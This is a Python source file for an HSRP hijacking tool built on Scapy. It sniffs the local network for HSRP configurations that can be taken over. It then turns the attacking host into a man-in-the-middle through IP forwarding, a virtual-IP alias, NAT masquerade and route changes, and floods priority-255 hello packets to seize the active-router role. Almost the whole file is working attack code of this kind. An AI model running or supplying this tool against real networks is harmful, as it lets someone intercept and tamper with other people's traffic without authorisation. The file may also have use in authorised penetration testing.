'''
Functions:
- sniff 
    -- able to sniff the network and look for presence of HSRP 
    -- able to detect if the current configuration of HSRP is vulnerable
    -- able to retrieve details of current HSRP configuration

- takeover as active HSRP router
    -- allows the attacking machine to takeover as the active HSRP router, using one of the 2 configurations
        -> default (use values in Packet class)
        -> user-supplied variables
'''

from scapy.all import *
from argparse import ArgumentParser
from colorama import init, Fore
from ipaddress import IPv4Address
import os

# coloura initialization
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET

# define default HSRP values
IFACE = 'eth0'
MAL_IP = '10.10.3.254'
VERSION = {'224.0.0.2':'1', '224.0.0.102':'2'}

class Packet:
    port = 1985
    multicast_ip = '224.0.0.2' 
    auth = 'cisco'
    prev_active = '10.10.3.2'
    src_ip = '10.10.3.20'
    virtual_ip = '10.10.3.1'
    priority = 255
    hello_int = 3
    hold_time = 10
    group = 1



def args():
    parser = ArgumentParser()

    parser.add_argument('--sniff', action='store_true', help='Sniff the network for HSRP packets and check if its vulnerable to HSRP hijacking')
    
    subparser = parser.add_subparsers(dest='command')
    takeover = subparser.add_parser('takeover', help='Hijack HSRP and takeover as active router')
    takeover.add_argument('--prev_active', nargs='?', type=str, required=True, help='Set the IP address of the previous active router')
    takeover.add_argument('--version', nargs='?', type=int, const=1, default=1, help="Sets the HSRP version. Default is 1")
    takeover.add_argument('--src_ip', nargs='?', type=str, help='Set the source IP address of malicious HSRP packet')
    takeover.add_argument('--group', nargs='?', type=int, help='Set group of HSRP that will be attacked')
    takeover.add_argument('--auth', nargs='?', type=str, help='Set the authentication key to be used')

    return parser.parse_args()



# sniff the network for presence of HSRP packets
def sniff_network():
    print(f"{GREEN}[+] {RESET} Starting HSRP sniffing...")
    sniff(timeout=10, iface=IFACE, filter="udp src port 1985 and udp dst port 1985", prn=process_pkt)



# check if HSRP config is vulnerable - i.e. priority < 255 / attacking ip addr higher than active router ip addr
def check_vulnerable(pkt):
    priority = pkt[HSRP].priority
    src_ip = pkt[IP].src

    if priority < 255 or IPv4Address(MAL_IP) > IPv4Address(src_ip):
        return True
    return False


# display details of HSRP if present and is vulnerable
def process_pkt(pkt):
    if pkt.haslayer(HSRP):
        # if state of HSRP is Active and its vulnerable
        if pkt[HSRP].state == 16 and check_vulnerable(pkt):
            print(
            f"\n\nHSRP version - {VERSION[pkt[IP].dst]}\n"+
            f"Group number - {pkt[HSRP].group}\n"+
            f"Source IP - {pkt[IP].src}\n"+
            f"Virtual IP - {pkt[HSRP].virtualIP}\n"+
            f"Priority - {pkt[HSRP].priority}\n"+
            "Vulnerable - Yes")
            return None  
    else:
        return ""
    

# set up the attacking machine as the Man-in-the-Middle
#   1. enable traffic routing on attacking machine 
#   2. opens a second network interface with the IP address of the virtual IP so traffic will route back to attacking machine
#   3. set up well-known source NAT to intercept all traffic
#   4. route all traffic to original active router so traffic will still be able to route out
def config_host(pkt):
    print(f"{GREEN}[+] {RESET} Configuring attacking machine as MiTM")
    os.system('sudo ip link set eth0 promisc on')
    os.system('sudo sysctl -w net.ipv4.ip_forward=1')
    os.system(f'sudo ifconfig eth0:1 {pkt.virtual_ip} netmask 255.255.255.0')
    os.system('sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE')
    os.system('sudo ip route flush 0/0')
    os.system(f'sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw {pkt.prev_active}')



# attempt to take over as Active HSRP router
def hsrp_v1(pkt):
    ip = IP(src=pkt.src_ip,dst=pkt.multicast_ip)
    udp = UDP(sport=pkt.port,dport=pkt.port)
    hsrp = HSRP(group=pkt.group,priority=pkt.priority,virtualIP=pkt.virtual_ip)
    print(f"{GREEN} [+] {RESET} Attempting HSRP takeover")
    send(ip/udp/hsrp, iface='eth0', inter=3, loop=1)



def main():
    arg = args()
    mal_pkt = Packet()

    if arg.sniff:
        sniff_network()
    elif arg.command == 'takeover':
        if arg.version == 1:
            if arg.src_ip != None: mal_pkt.src_ip = arg.src_ip
            if arg.group != None: mal_pkt.group = arg.group
            if arg.auth != None: mal_pkt.auth = arg.auth
            if arg.prev_active != None: mal_pkt.prev_active = arg.prev_active
            config_host(mal_pkt)
            hsrp_v1(mal_pkt)
        elif arg.version == 2:
            print("currently not supported")



if __name__ == '__main__':
    main()


